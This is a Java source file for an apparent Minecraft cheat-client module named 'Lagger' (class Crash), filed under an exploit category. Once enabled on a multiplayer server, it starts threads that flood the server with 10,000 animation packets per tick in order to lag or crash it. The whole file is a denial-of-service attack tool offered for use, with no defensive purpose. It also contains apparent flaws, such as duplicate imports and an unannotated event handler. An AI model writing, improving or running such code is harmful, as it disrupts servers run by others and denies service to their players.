package slientclient.mods;


import java.awt.Event;

import org.lwjgl.input.Keyboard;

import net.minecraft.client.Minecraft;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.network.play.client.CPacketPlayer;
import slientclient.event.EventManager;
import slientclient.event.EventPreTick;
import slientclient.event.EventTarget;
import slientclient.event.EventUpdate;
import slientclient.main.Category;
import slientclient.main.Slient;
import slientclient.notification_system.Notification;
import slientclient.notification_system.NotificationManager;
import slientclient.notification_system.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.network.play.client.CPacketPlayer.Position;

public class Crash
  extends Module
{
  int loop;
  
  public Crash()
  {
	  super("Lagger", 0, Category.EXPLOIT);
  }
  
  public void onEnable()
  {
    if (this.mc.isSingleplayer())
    {
    	Slient.addChatMessage("Multiplayer Only!");
      return;
    }
    NotificationManager.show(new Notification(NotificationType.INFO, "Crash", "Crashing...", 2));
    EventManager.register(this);
  }
  
	public void onDisable(){
		NotificationManager.show(new Notification(NotificationType.INFO, "Crash", "Crash was disabled.", 2));
    }

  public void preTick(final EventPreTick e) {
      if (this.isToggled()) {
          new Thread() {
              @Override
              public void run() {
                  for (int i = 0; i < 10000; ++i) {
                      Minecraft.getMinecraft().player.sendQueue.addToSendQueue(new CPacketAnimation());
                  }
              }
          }.start();
      }
  }
}
